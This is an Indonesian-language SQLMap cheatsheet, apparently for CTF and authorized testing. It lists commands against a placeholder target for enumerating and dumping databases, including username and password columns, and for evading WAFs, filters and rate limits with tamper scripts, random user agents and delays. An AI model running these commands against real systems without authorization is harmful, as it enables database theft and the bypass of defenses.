---
title: "SQLMap Cheatsheet"
section: resources
topic: cheatsheets
date_created: 2026-06-04
last_updated: 2026-06-04
tags: [sqlmap, sql-injection, cheatsheet]
---

# SQLMap Cheatsheet

> Gunakan hanya pada sistem yang lo punya izin untuk test.

## Dasar

```bash
# Test URL dengan parameter GET
sqlmap -u "http://target.com/page?id=1"

# Test URL, langsung batch (tidak interactive)
sqlmap -u "http://target.com/page?id=1" --batch

# Test dengan POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Tambahkan cookie (untuk yang butuh login)
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Pakai request dari file (copy dari Burp)
sqlmap -r request.txt
```

---

## Enumerasi Database

```bash
# List semua database
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# List tabel dari database tertentu
sqlmap -u "http://target.com/page?id=1" -D nama_database --tables --batch

# List kolom dari tabel tertentu
sqlmap -u "http://target.com/page?id=1" -D nama_database -T nama_tabel --columns --batch

# Dump isi tabel
sqlmap -u "http://target.com/page?id=1" -D nama_database -T nama_tabel --dump --batch

# Dump kolom tertentu saja
sqlmap -u "http://target.com/page?id=1" -D nama_database -T nama_tabel -C username,password --dump --batch
```

---

## Parameter

```bash
# Tentukan parameter yang mau ditest
sqlmap -u "http://target.com/page?id=1&user=admin" -p id

# Test semua parameter
sqlmap -u "http://target.com/page?id=1&user=admin"

# Test form di halaman secara otomatis
sqlmap -u "http://target.com/login" --forms --batch
```

---

## Level dan Risk

```bash
# Level 1-5, makin tinggi makin banyak test (default: 1)
sqlmap -u "http://target.com/page?id=1" --level=3

# Risk 1-3, makin tinggi makin agresif (default: 1)
# Risk 3 bisa modifikasi data, hati-hati
sqlmap -u "http://target.com/page?id=1" --risk=2

# Kombinasi untuk test yang lebih dalam
sqlmap -u "http://target.com/page?id=1" --level=3 --risk=2 --batch
```

---

## Bypass WAF / Filter

```bash
# Random User-Agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Pakai tamper script untuk bypass filter
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --tamper=between
sqlmap -u "http://target.com/page?id=1" --tamper=randomcase

# Beberapa tamper sekaligus
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# Tambah delay antar request (biar tidak kena rate limit)
sqlmap -u "http://target.com/page?id=1" --delay=1
```

---

## Tamper Scripts yang Sering Berguna

| Tamper | Fungsi |
|---|---|
| `space2comment` | Ganti spasi dengan `/**/` |
| `between` | Ganti `>` dengan `NOT BETWEEN 0 AND` |
| `randomcase` | Random uppercase/lowercase |
| `base64encode` | Encode payload ke base64 |
| `charencode` | URL encode karakter |
| `equaltolike` | Ganti `=` dengan `LIKE` |

---

## Output & Dump

```bash
# Simpan output ke direktori tertentu
sqlmap -u "http://target.com/page?id=1" --output-dir=/tmp/sqlmap

# Dump semua database (hati-hati, bisa lambat)
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Cari string tertentu di hasil dump
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump --search -C password
```

---

## Kombinasi yang Sering Dipakai di CTF

```bash
# Recon awal, cari database
sqlmap -u "http://target.com/page?id=1" --dbs --batch --random-agent

# Setelah dapat DB, cari tabel
sqlmap -u "http://target.com/page?id=1" -D target_db --tables --batch

# Dump tabel users/flag
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump --batch

# Dari Burp request file
sqlmap -r request.txt --dbs --batch --level=3
```

---

→ [Back to Tools](README.md)
